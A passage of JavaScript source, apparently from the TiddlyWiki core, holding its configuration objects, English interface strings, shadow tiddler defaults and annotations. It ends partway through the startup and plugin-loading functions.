config.tasks = {};

// Annotations
config.annotations = {};

// Custom fields to be automatically added to new tiddlers
config.defaultCustomFields = {};

// Messages
config.messages = {
	messageClose: {},
	dates: {},
	tiddlerPopup: {}
};

// Options that can be set in the options panel and/or cookies
config.options = {
	chkRegExpSearch: false,
	chkCaseSensitiveSearch: false,
	chkAnimate: true,
	chkSaveBackups: true,
	chkAutoSave: false,
	chkGenerateAnRssFeed: false,
	chkSaveEmptyTemplate: false,
	chkOpenInNewWindow: true,
	chkToggleLinks: false,
	chkHttpReadOnly: true,
	chkForceMinorUpdate: false,
	chkConfirmDelete: true,
	chkInsertTabs: false,
	chkUsePreForStorage: true, // Whether to use <pre> format for storage
	chkDisplayStartupTime: false,
	txtBackupFolder: "",
	txtMainTab: "tabTimeline",
	txtMoreTab: "moreTabAll",
	txtMaxEditRows: "30",
	txtFileSystemCharSet: "UTF-8"
	};
config.optionsDesc = {};
	
// List of notification functions to be called when certain tiddlers are changed or deleted
config.notifyTiddlers = [
	{name: "StyleSheetLayout", notify: refreshStyles},
	{name: "StyleSheetColors", notify: refreshStyles},
	{name: "StyleSheet", notify: refreshStyles},
	{name: "StyleSheetPrint", notify: refreshStyles},
	{name: "PageTemplate", notify: refreshPageTemplate},
	{name: "SiteTitle", notify: refreshPageTitle},
	{name: "SiteSubtitle", notify: refreshPageTitle},
	{name: "ColorPalette", notify: refreshColorPalette},
	{name: null, notify: refreshDisplay}
];

// Default tiddler templates
var DEFAULT_VIEW_TEMPLATE = 1;
var DEFAULT_EDIT_TEMPLATE = 2;
config.tiddlerTemplates = {
	1: "ViewTemplate",
	2: "EditTemplate"
};

// More messages (rather a legacy layout that shouldn't really be like this)
config.views = {
	wikified: {
		tag: {}
	},
	editor: {
		tagChooser: {}
	}
};

// Backstage tasks
config.backstageTasks = ["save","sync","importTask","tweak","plugins"];

// Macros; each has a 'handler' member that is inserted later
config.macros = {
	today: {},
	version: {},
	search: {sizeTextbox: 15},
	tiddler: {},
	tag: {},
	tags: {},
	tagging: {},
	timeline: {},
	allTags: {},
	list: {
		all: {},
		missing: {},
		orphans: {},
		shadowed: {},
		touched: {}
	},
	closeAll: {},
	permaview: {},
	saveChanges: {},
	slider: {},
	option: {},
	options: {},
	newTiddler: {},
	newJournal: {},
	sparkline: {},
	tabs: {},
	gradient: {},
	message: {},
	view: {},
	edit: {},
	tagChooser: {},
	toolbar: {},
	br: {},
	plugins: {},
	refreshDisplay: {},
	importTiddlers: {},
	sync: {},
	annotations: {}
};

// Commands supported by the toolbar macro
config.commands = {
	closeTiddler: {},
	closeOthers: {},
	editTiddler: {},
	saveTiddler: {hideReadOnly: true},
	cancelTiddler: {},
	deleteTiddler: {hideReadOnly: true},
	permalink: {},
	references: {type: "popup"},
	jump: {type: "popup"},
	syncing: {type: "popup"},
	fields: {type: "popup"}
};

// Browser detection... In a very few places, there's nothing else for it but to know what browser we're using.
config.userAgent = navigator.userAgent.toLowerCase();
config.browser = {
	isIE: config.userAgent.indexOf("msie") != -1 && config.userAgent.indexOf("opera") == -1,
	isGecko: config.userAgent.indexOf("gecko") != -1,
	ieVersion: /MSIE (\d.\d)/i.exec(config.userAgent), // config.browser.ieVersion[1], if it exists, will be the IE version string, eg "6.0"
	isSafari: config.userAgent.indexOf("applewebkit") != -1,
	isBadSafari: !((new RegExp("[\u0150\u0170]","g")).test("\u0150")),
	firefoxDate: /gecko\/(\d{8})/i.exec(config.userAgent), // config.browser.firefoxDate[1], if it exists, will be Firefox release date as "YYYYMMDD"
	isOpera: config.userAgent.indexOf("opera") != -1,
	isLinux: config.userAgent.indexOf("linux") != -1,
	isUnix: config.userAgent.indexOf("x11") != -1,
	isMac: config.userAgent.indexOf("mac") != -1,
	isWindows: config.userAgent.indexOf("win") != -1
};

// Basic regular expressions
config.textPrimitives = {
	upperLetter: "[A-Z\u00c0-\u00de\u0150\u0170]",
	lowerLetter: "[a-z0-9_\\-\u00df-\u00ff\u0151\u0171]",
	anyLetter:   "[A-Za-z0-9_\\-\u00c0-\u00de\u00df-\u00ff\u0150\u0170\u0151\u0171]",
	anyLetterStrict: "[A-Za-z0-9\u00c0-\u00de\u00df-\u00ff\u0150\u0170\u0151\u0171]"
};
if(config.browser.isBadSafari) {
	config.textPrimitives = {
		upperLetter: "[A-Z\u00c0-\u00de]",
		lowerLetter: "[a-z0-9_\\-\u00df-\u00ff]",
		anyLetter:   "[A-Za-z0-9_\\-\u00c0-\u00de\u00df-\u00ff]",
		anyLetterStrict: "[A-Za-z0-9\u00c0-\u00de\u00df-\u00ff]"
	};
}
config.textPrimitives.sliceSeparator = "::";
config.textPrimitives.urlPattern = "[a-z]{3,8}:[^\\s:'\"][^\\s'\"]*(?:/|\\b)";
config.textPrimitives.unWikiLink = "~";
config.textPrimitives.wikiLink = "(?:(?:" + config.textPrimitives.upperLetter + "+" +
	config.textPrimitives.lowerLetter + "+" +
	config.textPrimitives.upperLetter +
	config.textPrimitives.anyLetter + "*)|(?:" +
	config.textPrimitives.upperLetter + "{2,}" +
	config.textPrimitives.lowerLetter + "+))";

config.textPrimitives.cssLookahead = "(?:(" + config.textPrimitives.anyLetter + "+)\\(([^\\)\\|\\n]+)(?:\\):))|(?:(" + config.textPrimitives.anyLetter + "+):([^;\\|\\n]+);)";
config.textPrimitives.cssLookaheadRegExp = new RegExp(config.textPrimitives.cssLookahead,"mg");

config.textPrimitives.brackettedLink = "\\[\\[([^\\]]+)\\]\\]";
config.textPrimitives.titledBrackettedLink = "\\[\\[([^\\[\\]\\|]+)\\|([^\\[\\]\\|]+)\\]\\]";
config.textPrimitives.tiddlerForcedLinkRegExp = new RegExp("(?:" + config.textPrimitives.titledBrackettedLink + ")|(?:" +
	config.textPrimitives.brackettedLink + ")|(?:" + 
	config.textPrimitives.urlPattern + ")","mg");
config.textPrimitives.tiddlerAnyLinkRegExp = new RegExp("("+ config.textPrimitives.wikiLink + ")|(?:" +
	config.textPrimitives.titledBrackettedLink + ")|(?:" +
	config.textPrimitives.brackettedLink + ")|(?:" +
	config.textPrimitives.urlPattern + ")","mg");

config.glyphs = {
	browsers: [
		function() {return config.browser.isIE;},
		function() {return true}
	],
	currBrowser: null,
	codes: {
		downTriangle: ["\u25BC","\u25BE"],
		downArrow: ["\u2193","\u2193"],
		bentArrowLeft: ["\u2190","\u21A9"],
		bentArrowRight: ["\u2192","\u21AA"]
	}
};

//--
//-- Shadow tiddlers
//--

config.shadowTiddlers = {
	StyleSheet: "",
	MarkupPreHead: "<!--{{{-->\n<link rel='alternate' type='application/rss+xml' title='RSS' href='index.xml'/>\n<!--}}}-->",
	MarkupPostHead: "",
	MarkupPreBody: "",
	MarkupPostBody: "",
	TabTimeline: '<<timeline>>',
	TabAll: '<<list all>>',
	TabTags: '<<allTags excludeLists>>',
	TabMoreMissing: '<<list missing>>',
	TabMoreOrphans: '<<list orphans>>',
	TabMoreShadowed: '<<list shadowed>>',
	AdvancedOptions: '<<options>>',
	PluginManager: '<<plugins>>',
	ImportTiddlers: '<<importTiddlers>>'
};

//--
//-- Translateable strings
//--

// Strings in "double quotes" should be translated; strings in 'single quotes' should be left alone

merge(config.options,{
	txtUserName: "YourName"});

merge(config.tasks,{
	save: {text: "save", tooltip: "Save your changes to this TiddlyWiki", action: saveChanges},
	sync: {text: "sync", tooltip: "Synchronise changes with other TiddlyWiki files and servers", content: '<<sync>>'},
	importTask: {text: "import", tooltip: "Import tiddlers and plugins from other TiddlyWiki files and servers", content: '<<importTiddlers>>'},
	tweak: {text: "tweak", tooltip: "Tweak the appearance and behaviour of TiddlyWiki", content: '<<options>>'},
	plugins: {text: "plugins", tooltip: "Manage installed plugins", content: '<<plugins>>'}
});

// Options that can be set in the options panel and/or cookies
merge(config.optionsDesc,{
	txtUserName: "Username for signing your edits",
	chkRegExpSearch: "Enable regular expressions for searches",
	chkCaseSensitiveSearch: "Case-sensitive searching",
	chkAnimate: "Enable animations",
	chkSaveBackups: "Keep backup file when saving changes",
	chkAutoSave: "Automatically save changes",
	chkGenerateAnRssFeed: "Generate an RSS feed when saving changes",
	chkSaveEmptyTemplate: "Generate an empty template when saving changes",
	chkOpenInNewWindow: "Open external links in a new window",
	chkToggleLinks: "Clicking on links to open tiddlers causes them to close",
	chkHttpReadOnly: "Hide editing features when viewed over HTTP",
	chkForceMinorUpdate: "Don't update modifier username and date when editing tiddlers",
	chkConfirmDelete: "Require confirmation before deleting tiddlers",
	chkInsertTabs: "Use the tab key to insert tab characters instead of moving between fields",
	txtBackupFolder: "Name of folder to use for backups",
	txtMaxEditRows: "Maximum number of rows in edit boxes",
	txtFileSystemCharSet: "Default character set for saving changes (Firefox/Mozilla only)"});

merge(config.messages,{
	customConfigError: "Problems were encountered loading plugins. See PluginManager for details",
	pluginError: "Error: %0",
	pluginDisabled: "Not executed because disabled via 'systemConfigDisable' tag",
	pluginForced: "Executed because forced via 'systemConfigForce' tag",
	pluginVersionError: "Not executed because this plugin needs a newer version of TiddlyWiki",
	nothingSelected: "Nothing is selected. You must select one or more items first",
	savedSnapshotError: "It appears that this TiddlyWiki has been incorrectly saved. Please see http://www.tiddlywiki.com/#DownloadSoftware for details",
	subtitleUnknown: "(unknown)",
	undefinedTiddlerToolTip: "The tiddler '%0' doesn't yet exist",
	shadowedTiddlerToolTip: "The tiddler '%0' doesn't yet exist, but has a pre-defined shadow value",
	tiddlerLinkTooltip: "%0 - %1, %2",
	externalLinkTooltip: "External link to %0",
	noTags: "There are no tagged tiddlers",
	notFileUrlError: "You need to save this TiddlyWiki to a file before you can save changes",
	cantSaveError: "It's not possible to save changes. Possible reasons include:\n- your browser doesn't support saving (Firefox, Internet Explorer, Safari and Opera all work if properly configured)\n- the pathname to your TiddlyWiki file contains illegal characters\n- the TiddlyWiki HTML file has been moved or renamed",
	invalidFileError: "The original file '%0' does not appear to be a valid TiddlyWiki",
	backupSaved: "Backup saved",
	backupFailed: "Failed to save backup file",
	rssSaved: "RSS feed saved",
	rssFailed: "Failed to save RSS feed file",
	emptySaved: "Empty template saved",
	emptyFailed: "Failed to save empty template file",
	mainSaved: "Main TiddlyWiki file saved",
	mainFailed: "Failed to save main TiddlyWiki file. Your changes have not been saved",
	macroError: "Error in macro <<\%0>>",
	macroErrorDetails: "Error while executing macro <<\%0>>:\n%1",
	missingMacro: "No such macro",
	overwriteWarning: "A tiddler named '%0' already exists. Choose OK to overwrite it",
	unsavedChangesWarning: "WARNING! There are unsaved changes in TiddlyWiki\n\nChoose OK to save\nChoose CANCEL to discard",
	confirmExit: "--------------------------------\n\nThere are unsaved changes in TiddlyWiki. If you continue you will lose those changes\n\n--------------------------------",
	saveInstructions: "SaveChanges",
	unsupportedTWFormat: "Unsupported TiddlyWiki format '%0'",
	tiddlerSaveError: "Error when saving tiddler '%0'",
	tiddlerLoadError: "Error when loading tiddler '%0'",
	wrongSaveFormat: "Cannot save with storage format '%0'. Using standard format for save.",
	invalidFieldName: "Invalid field name %0",
	fieldCannotBeChanged: "Field '%0' cannot be changed",
	loadingMissingTiddler: "Attempting to retrieve the tiddler '%0' from the '%1' server at:\n\n'%2' in the workspace '%3'"});

merge(config.messages.messageClose,{
	text: "close",
	tooltip: "close this message area"});

config.messages.backstage = {
	open: {text: "backstage", tooltip: "Open the backstage area to perform authoring and editing tasks"},
	close: {text: "close", tooltip: "Close the backstage area"},
	prompt: "backstage: ",
	decal: {
		edit: {text: "edit", tooltip: "Edit the tiddler '%0'"}
	}
};

config.messages.listView = {
	tiddlerTooltip: "Click for the full text of this tiddler",
	previewUnavailable: "(preview not available)"
};

config.messages.dates.months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November","December"];
config.messages.dates.days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
config.messages.dates.shortMonths = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
config.messages.dates.shortDays = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
// suffixes for dates, eg "1st","2nd","3rd"..."30th","31st"
config.messages.dates.daySuffixes = ["st","nd","rd","th","th","th","th","th","th","th",
		"th","th","th","th","th","th","th","th","th","th",
		"st","nd","rd","th","th","th","th","th","th","th",
		"st"];
config.messages.dates.am = "am";
config.messages.dates.pm = "pm";

merge(config.messages.tiddlerPopup,{
	});

merge(config.views.wikified.tag,{
	labelNoTags: "no tags",
	labelTags: "tags: ",
	openTag: "Open tag '%0'",
	tooltip: "Show tiddlers tagged with '%0'",
	openAllText: "Open all",
	openAllTooltip: "Open all of these tiddlers",
	popupNone: "No other tiddlers tagged with '%0'"});

merge(config.views.wikified,{
	defaultText: "The tiddler '%0' doesn't yet exist. Double-click to create it",
	defaultModifier: "(missing)",
	shadowModifier: "(built-in shadow tiddler)",
	dateFormat: "DD MMM YYYY",
	createdPrompt: "created"});

merge(config.views.editor,{
	tagPrompt: "Type tags separated with spaces, [[use double square brackets]] if necessary, or add existing",
	defaultText: "Type the text for '%0'"});

merge(config.views.editor.tagChooser,{
	text: "tags",
	tooltip: "Choose existing tags to add to this tiddler",
	popupNone: "There are no tags defined",
	tagTooltip: "Add the tag '%0'"});

merge(config.messages,{
	sizeTemplates:
		[
		{unit: 1024*1024*1024, template: "%0\u00a0GB"},
		{unit: 1024*1024, template: "%0\u00a0MB"},
		{unit: 1024, template: "%0\u00a0KB"},
		{unit: 1, template: "%0\u00a0B"}
		]});

merge(config.macros.search,{
	label: "search",
	prompt: "Search this TiddlyWiki",
	accessKey: "F",
	successMsg: "%0 tiddlers found matching %1",
	failureMsg: "No tiddlers found matching %0"});

merge(config.macros.tagging,{
	label: "tagging: ",
	labelNotTag: "not tagging",
	tooltip: "List of tiddlers tagged with '%0'"});

merge(config.macros.timeline,{
	dateFormat: "DD MMM YYYY"});

merge(config.macros.allTags,{
	tooltip: "Show tiddlers tagged with '%0'",
	noTags: "There are no tagged tiddlers"});

config.macros.list.all.prompt = "All tiddlers in alphabetical order";
config.macros.list.missing.prompt = "Tiddlers that have links to them but are not defined";
config.macros.list.orphans.prompt = "Tiddlers that are not linked to from any other tiddlers";
config.macros.list.shadowed.prompt = "Tiddlers shadowed with default contents";
config.macros.list.touched.prompt = "Tiddlers that have been modified locally";

merge(config.macros.closeAll,{
	label: "close all",
	prompt: "Close all displayed tiddlers (except any that are being edited)"});

merge(config.macros.permaview,{
	label: "permaview",
	prompt: "Link to an URL that retrieves all the currently displayed tiddlers"});

merge(config.macros.saveChanges,{
	label: "save changes",
	prompt: "Save all tiddlers to create a new TiddlyWiki",
	accessKey: "S"});

merge(config.macros.newTiddler,{
	label: "new tiddler",
	prompt: "Create a new tiddler",
	title: "New Tiddler",
	accessKey: "N"});

merge(config.macros.newJournal,{
	label: "new journal",
	prompt: "Create a new tiddler from the current date and time",
	accessKey: "J"});

merge(config.macros.options,{
	wizardTitle: "Tweak advanced options",
	step1Title: "These options are saved in cookies in your browser",
	step1Html: "<input type='hidden' name='markList'></input><br><input type='checkbox' checked='false' name='chkUnknown'>Show unknown options</input>",
	unknownDescription: "//(unknown)//",
	listViewTemplate: {
		columns: [
			{name: 'Option', field: 'option', title: "Option", type: 'String'},
			{name: 'Description', field: 'description', title: "Description", type: 'WikiText'},
			{name: 'Name', field: 'name', title: "Name", type: 'String'}
			],
		rowClasses: [
			{className: 'lowlight', field: 'lowlight'} 
			]}
	});

merge(config.macros.plugins,{
	wizardTitle: "Manage plugins",
	step1Title: "Currently loaded plugins",
	step1Html: "<input type='hidden' name='markList'></input>", // DO NOT TRANSLATE
	skippedText: "(This plugin has not been executed because it was added since startup)",
	noPluginText: "There are no plugins installed",
	confirmDeleteText: "Are you sure you want to delete these plugins:\n\n%0",
	removeLabel: "remove systemConfig tag",
	removePrompt: "Remove systemConfig tag",
	deleteLabel: "delete",
	deletePrompt: "Delete these tiddlers forever",
	listViewTemplate: {
		columns: [
			{name: 'Selected', field: 'Selected', rowName: 'title', type: 'Selector'},
			{name: 'Tiddler', field: 'tiddler', title: "Tiddler", type: 'Tiddler'},
			{name: 'Size', field: 'size', tiddlerLink: 'size', title: "Size", type: 'Size'},
			{name: 'Forced', field: 'forced', title: "Forced", tag: 'systemConfigForce', type: 'TagCheckbox'},
			{name: 'Disabled', field: 'disabled', title: "Disabled", tag: 'systemConfigDisable', type: 'TagCheckbox'},
			{name: 'Executed', field: 'executed', title: "Loaded", type: 'Boolean', trueText: "Yes", falseText: "No"},
			{name: 'Startup Time', field: 'startupTime', title: "Startup Time", type: 'String'},
			{name: 'Error', field: 'error', title: "Status", type: 'Boolean', trueText: "Error", falseText: "OK"},
			{name: 'Log', field: 'log', title: "Log", type: 'StringList'}
			],
		rowClasses: [
			{className: 'error', field: 'error'},
			{className: 'warning', field: 'warning'}
			]}
	});

merge(config.macros.toolbar,{
	moreLabel: "more",
	morePrompt: "Reveal further commands"
	});

merge(config.macros.refreshDisplay,{
	label: "refresh",
	prompt: "Redraw the entire TiddlyWiki display"
	});

merge(config.macros.importTiddlers,{
	readOnlyWarning: "You cannot import into a read-only TiddlyWiki file. Try opening it from a file:// URL",
	wizardTitle: "Import tiddlers from another file or server",
	step1Title: "Step 1: Locate the server or TiddlyWiki file",
	step1Html: "Specify the type of the server: <select name='selTypes'><option value=''>Choose...</option></select><br>Enter the URL or pathname here: <input type='text' size=50 name='txtPath'><br>...or browse for a file: <input type='file' size=50 name='txtBrowse'><br><hr>...or select a pre-defined feed: <select name='selFeeds'><option value=''>Choose...</option></select>",
	openLabel: "open",
	openPrompt: "Open the connection to this file or server",
	openError: "There were problems fetching the tiddlywiki file",
	statusOpenHost: "Opening the host",
	statusGetWorkspaceList: "Getting the list of available workspaces",
	step2Title: "Step 2: Choose the workspace",
	step2Html: "Enter a workspace name: <input type='text' size=50 name='txtWorkspace'><br>...or select a workspace: <select name='selWorkspace'><option value=''>Choose...</option></select>",
	cancelLabel: "cancel",
	cancelPrompt: "Cancel this import",
	statusOpenWorkspace: "Opening the workspace",
	statusGetTiddlerList: "Getting the list of available tiddlers",
	step3Title: "Step 3: Choose the tiddlers to import",
	step3Html: "<input type='hidden' name='markList'></input><br><input type='checkbox' checked='true' name='chkSync'>Keep these tiddlers linked to this server so that you can synchronise subsequent changes</input><br><input type='checkbox' name='chkSave'>Save the details of this server in a 'systemServer' tiddler called:</input> <input type='text' size=25 name='txtSaveTiddler'>",
	importLabel: "import",
	importPrompt: "Import these tiddlers",
	confirmOverwriteText: "Are you sure you want to overwrite these tiddlers:\n\n%0",
	step4Title: "Step 4: Importing %0 tiddler(s)",
	step4Html: "<input type='hidden' name='markReport'></input>", // DO NOT TRANSLATE
	doneLabel: "done",
	donePrompt: "Close this wizard",
	statusDoingImport: "Importing tiddlers",
	statusDoneImport: "All tiddlers imported",
	systemServerNamePattern: "%2 on %1",
	systemServerNamePatternNoWorkspace: "%1",
	confirmOverwriteSaveTiddler: "The tiddler '%0' already exists. Click 'OK' to overwrite it with the details of this server, or 'Cancel' to leave it unchanged",
	serverSaveTemplate: "|''Type:''|%0|\n|''URL:''|%1|\n|''Workspace:''|%2|\n\nThis tiddler was automatically created to record the details of this server",
	serverSaveModifier: "(System)",
	listViewTemplate: {
		columns: [
			{name: 'Selected', field: 'Selected', rowName: 'title', type: 'Selector'},
			{name: 'Tiddler', field: 'tiddler', title: "Tiddler", type: 'Tiddler'},
			{name: 'Size', field: 'size', tiddlerLink: 'size', title: "Size", type: 'Size'},
			{name: 'Tags', field: 'tags', title: "Tags", type: 'Tags'}
			],
		rowClasses: [
			]}
	});

merge(config.macros.sync,{
	listViewTemplate: {
		columns: [
			{name: 'Selected', field: 'selected', rowName: 'title', type: 'Selector'},
			{name: 'Tiddler', field: 'tiddler', title: "Tiddler", type: 'Tiddler'},
			{name: 'Server Type', field: 'serverType', title: "Server type", type: 'String'},
			{name: 'Server Host', field: 'serverHost', title: "Server host", type: 'String'},
			{name: 'Server Workspace', field: 'serverWorkspace', title: "Server workspace", type: 'String'},
			{name: 'Status', field: 'status', title: "Synchronisation status", type: 'String'},
			{name: 'Server URL', field: 'serverUrl', title: "Server URL", text: "View", type: 'Link'}
			],
		rowClasses: [
			],
		buttons: [
			{caption: "Sync these tiddlers", name: 'sync'}
			]},
	wizardTitle: "Synchronize with external servers and files",
	step1Title: "Choose the tiddlers you want to synchronize",
	step1Html: "<input type='hidden' name='markList'></input>", // DO NOT TRANSLATE
	syncLabel: "sync",
	syncPrompt: "Sync these tiddlers",
	hasChanged: "Changed while unplugged",
	hasNotChanged: "Unchanged while unplugged",
	syncStatusList: {
		none: {text: "...", color: "none"},
		changedServer: {text: "Changed on server", color: '#80ff80'},
		changedLocally: {text: "Changed while unplugged", color: '#80ff80'},
		changedBoth: {text: "Changed while unplugged and on server", color: '#ff8080'},
		notFound: {text: "Not found on server", color: '#ffff80'},
		putToServer: {text: "Saved update on server", color: '#ff80ff'},
		gotFromServer: {text: "Retrieved update from server", color: '#80ffff'}
		}
	});

merge(config.macros.annotations,{
	});

merge(config.commands.closeTiddler,{
	text: "close",
	tooltip: "Close this tiddler"});

merge(config.commands.closeOthers,{
	text: "close others",
	tooltip: "Close all other tiddlers"});

merge(config.commands.editTiddler,{
	text: "edit",
	tooltip: "Edit this tiddler",
	readOnlyText: "view",
	readOnlyTooltip: "View the source of this tiddler"});

merge(config.commands.saveTiddler,{
	text: "done",
	tooltip: "Save changes to this tiddler"});

merge(config.commands.cancelTiddler,{
	text: "cancel",
	tooltip: "Undo changes to this tiddler",
	warning: "Are you sure you want to abandon your changes to '%0'?",
	readOnlyText: "done",
	readOnlyTooltip: "View this tiddler normally"});

merge(config.commands.deleteTiddler,{
	text: "delete",
	tooltip: "Delete this tiddler",
	warning: "Are you sure you want to delete '%0'?"});

merge(config.commands.permalink,{
	text: "permalink",
	tooltip: "Permalink for this tiddler"});

merge(config.commands.references,{
	text: "references",
	tooltip: "Show tiddlers that link to this one",
	popupNone: "No references"});

merge(config.commands.jump,{
	text: "jump",
	tooltip: "Jump to another open tiddler"});

merge(config.commands.syncing,{
	text: "syncing",
	tooltip: "Control synchronisation of this tiddler with a server or external file",
	currentlySyncing: "<div>Currently syncing via <span class='popupHighlight'>'%0'</span> to:</"+"div><div>host: <span class='popupHighlight'>%1</span></"+"div><div>workspace: <span class='popupHighlight'>%2</span></"+"div>", // Note escaping of closing <div> tag
	notCurrentlySyncing: "Not currently syncing",
	captionUnSync: "Stop synchronising this tiddler",
	chooseServer: "Synchronise this tiddler with another server:",
	currServerMarker: "\u25cf ",
	notCurrServerMarker: "  "});

merge(config.commands.fields,{
	text: "fields",
	tooltip: "Show the extended fields of this tiddler",
	emptyText: "There are no extended fields for this tiddler",
	listViewTemplate: {
		columns: [
			{name: 'Field', field: 'field', title: "Field", type: 'String'},
			{name: 'Value', field: 'value', title: "Value", type: 'String'}
			],
		rowClasses: [
			],
		buttons: [
			]}});

merge(config.shadowTiddlers,{
	DefaultTiddlers: "GettingStarted",
	MainMenu: "GettingStarted",
	SiteTitle: "My TiddlyWiki",
	SiteSubtitle: "a reusable non-linear personal web notebook",
	SiteUrl: "http://www.tiddlywiki.com/",
	SideBarOptions: '<<search>><<closeAll>><<permaview>><<newTiddler>><<newJournal "DD MMM YYYY">><<saveChanges>><<slider chkSliderOptionsPanel OptionsPanel "options " "Change TiddlyWiki advanced options">>',
	SideBarTabs: '<<tabs txtMainTab "Timeline" "Timeline" TabTimeline "All" "All tiddlers" TabAll "Tags" "All tags" TabTags "More" "More lists" TabMore>>',
	TabMore: '<<tabs txtMoreTab "Missing" "Missing tiddlers" TabMoreMissing "Orphans" "Orphaned tiddlers" TabMoreOrphans "Shadowed" "Shadowed tiddlers" TabMoreShadowed>>'});

merge(config.annotations,{
	AdvancedOptions: "This shadow tiddler provides access to several advanced options",
	ColorPalette: "These values in this shadow tiddler determine the colour scheme of the ~TiddlyWiki user interface",
	DefaultTiddlers: "The tiddlers listed in this shadow tiddler will be automatically displayed when ~TiddlyWiki starts up",
	EditTemplate: "The HTML template in this shadow tiddler determines how tiddlers look while they are being edited",
	GettingStarted: "This shadow tiddler provides basic usage instructions",
	ImportTiddlers: "This shadow tiddler provides access to importing tiddlers",
	MainMenu: "This shadow tiddler is used as the contents of the main menu in the left-hand column of the screen",
	MarkupPreHead: "This tiddler is inserted at the top of the <head> section of the TiddlyWiki HTML file",
	MarkupPostHead: "This tiddler is inserted at the bottom of the <head> section of the TiddlyWiki HTML file",
	MarkupPreBody: "This tiddler is inserted at the top of the <body> section of the TiddlyWiki HTML file",
	MarkupPostBody: "This tiddler is inserted at the end of the <body> section of the TiddlyWiki HTML file immediately before the script block",
	OptionsPanel: "This shadow tiddler is used as the contents of the options panel slider in the right-hand sidebar",
	PageTemplate: "The HTML template in this shadow tiddler determines the overall ~TiddlyWiki layout",
	PluginManager: "This shadow tiddler provides access to the plugin manager",
	SideBarOptions: "This shadow tiddler is used as the contents of the option panel in the right-hand sidebar",
	SideBarTabs: "This shadow tiddler is used as the contents of the tabs panel in the right-hand sidebar",
	SiteSubtitle: "This shadow tiddler is used as the second part of the page title",
	SiteTitle: "This shadow tiddler is used as the first part of the page title",
	SiteUrl: "This shadow tiddler should be set to the full target URL for publication",
	StyleSheetColours: "This shadow tiddler contains CSS definitions related to the color of page elements",
	StyleSheet: "This tiddler can contain custom CSS definitions",
	StyleSheetLayout: "This shadow tiddler contains CSS definitions related to the layout of page elements",
	StyleSheetLocale: "This shadow tiddler contains CSS definitions related to the translation locale",
	StyleSheetPrint: "This shadow tiddler contains CSS definitions for printing",
	TabAll: "This shadow tiddler contains the contents of the 'All' tab in the right-hand sidebar",
	TabMore: "This shadow tiddler contains the contents of the 'More' tab in the right-hand sidebar",
	TabMoreMissing: "This shadow tiddler contains the contents of the 'Missing' tab in the right-hand sidebar",
	TabMoreOrphans: "This shadow tiddler contains the contents of the 'Orphans' tab in the right-hand sidebar",
	TabMoreShadowed: "This shadow tiddler contains the contents of the 'Shadowed' tab in the right-hand sidebar",
	TabTags: "This shadow tiddler contains the contents of the 'Tags' tab in the right-hand sidebar",
	TabTimeline: "This shadow tiddler contains the contents of the 'Timeline' tab in the right-hand sidebar",
	ViewTemplate: "The HTML template in this shadow tiddler determines how tiddlers look"
	});

//--
//-- Main
//--

var params = null; // Command line parameters
var store = null; // TiddlyWiki storage
var story = null; // Main story
var formatter = null; // Default formatters for the wikifier
config.parsers = {}; // Hashmap of alternative parsers for the wikifier
var anim = new Animator(); // Animation engine
var readOnly = false; // Whether we're in readonly mode
var highlightHack = null; // Embarrassing hack department...
var hadConfirmExit = false; // Don't warn more than once
var safeMode = false; // Disable all plugins and cookies
var installedPlugins = []; // Information filled in when plugins are executed
var startingUp = false; // Whether we're in the process of starting up
var pluginInfo,tiddler; // Used to pass information to plugins in loadPlugins()

// Whether to use the JavaSaver applet
var useJavaSaver = config.browser.isSafari || config.browser.isOpera;

// Starting up
function main()
{
	var t9,t8,t7,t6,t5,t4,t3,t2,t1,t0 = new Date();
	startingUp = true;
	window.onbeforeunload = function(e) {if(window.confirmExit) return confirmExit();};
	params = getParameters();
	if(params)
		params = params.parseParams("open",null,false);
	store = new TiddlyWiki();
	invokeParamifier(params,"oninit");
	story = new Story("tiddlerDisplay","tiddler");
	addEvent(document,"click",Popup.onDocumentClick);
	saveTest();
	loadOptionsCookie();
	for(var s=0; s<config.notifyTiddlers.length; s++)
		store.addNotification(config.notifyTiddlers[s].name,config.notifyTiddlers[s].notify);
	t1 = new Date();
	store.loadFromDiv("storeArea","store",true);
	t2 = new Date();
	loadShadowTiddlers();
	t3 = new Date();
	invokeParamifier(params,"onload");
	t4 = new Date();
	readOnly = (window.location.protocol == "file:") ? false : config.options.chkHttpReadOnly;
	var pluginProblem = loadPlugins();
	t5 = new Date();
	formatter = new Formatter(config.formatters);
	invokeParamifier(params,"onconfig");
	t6 = new Date();
	store.notifyAll();
	t7 = new Date();
	restart();
	t8 = new Date();
	if(pluginProblem) {
		story.displayTiddler(null,"PluginManager");
		displayMessage(config.messages.customConfigError);
	}
	for(var m in config.macros) {
		if(config.macros[m].init)
			config.macros[m].init();
	}
	if(!readOnly)
		backstage.init();
	t9 = new Date();
	if(config.options.chkDisplayStartupTime) {
		displayMessage("Load in " + (t2-t1) + " ms");
		displayMessage("Loadshadows in " + (t3-t2) + " ms");
		displayMessage("Loadplugins in " + (t5-t4) + " ms");
		displayMessage("Notify in " + (t7-t6) + " ms");
		displayMessage("Restart in " + (t8-t7) + " ms");
		displayMessage("Total startup in " + (t9-t0) + " ms");
	}
	startingUp = false;
}

// Restarting
function restart()
{
	invokeParamifier(params,"onstart");
	if(story.isEmpty()) {
		var defaultParams = store.getTiddlerText("DefaultTiddlers").parseParams("open",null,false);
		invokeParamifier(defaultParams,"onstart");
	}
	window.scrollTo(0,0);
}

function saveTest()
{
	var s = document.getElementById("saveTest");
	if(s.hasChildNodes())
		alert(config.messages.savedSnapshotError);
	s.appendChild(document.createTextNode("savetest"));
}

function loadShadowTiddlers()
{
	var shadows = new TiddlyWiki();
	shadows.loadFromDiv("shadowArea","shadows",true);
	shadows.forEachTiddler(function(title,tiddler){config.shadowTiddlers[title] = tiddler.text;});
	delete shadows;
}

function loadPlugins()
{
	if(safeMode)
		return false;
	var tiddlers = store.getTaggedTiddlers("systemConfig");
	var toLoad = [];
	var nLoaded = 0;
	var map = {};
	var nPlugins = tiddlers.length;
	installedPlugins = [];
	for(var i=0; i<nPlugins; i++) {
		var p = getPluginInfo(tiddlers[i]);
		installedPlugins[i] = p;
		var n = p.Name;
		if(n) 
			map[n] = p;
		if(n = p.Source) 
			map[n] = p;
	}
	var visit = function(p) {
		if(!p || p.done)
			return;
		p.done = 1;
